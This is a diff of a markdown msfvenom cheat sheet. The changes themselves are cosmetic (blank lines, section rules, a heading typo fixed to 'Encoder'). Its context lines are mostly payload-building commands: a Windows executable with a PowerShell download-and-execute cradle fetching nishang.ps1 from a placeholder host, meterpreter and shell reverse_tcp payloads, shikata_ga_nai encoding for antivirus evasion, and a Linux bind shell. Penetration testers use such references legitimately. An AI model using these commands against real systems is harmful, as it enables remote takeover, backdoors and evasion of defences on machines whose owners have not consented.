@@ -64,7 +64,6 @@ Example: `/opt/metasploit-framework/bin/../embedded/framework/msfvenom -p window
     -h, --help                       Show this message
 ```
 
-
 ### List 
 ---
 ```bash
@@ -98,8 +97,7 @@ Example: `/opt/metasploit-framework/bin/../embedded/framework/msfvenom -p window
 # msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > FILE.exe
 # msfvenom -a x86 --platform Windows -p windows/exec CMD="dir c:\" -f exe > FILE.exe
 ```
-#### Enoder
----
+#### Encoder
 ```bash
 # msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > FILE.exe
 ```
@@ -116,7 +114,6 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP) LPORT=(PORT) -f elf > F
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > FILE.elf
 ```
 #### Bind Shell
----
 ```bash
 # msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP) LPORT=(PORT) -f elf > FILE.elf
 ```
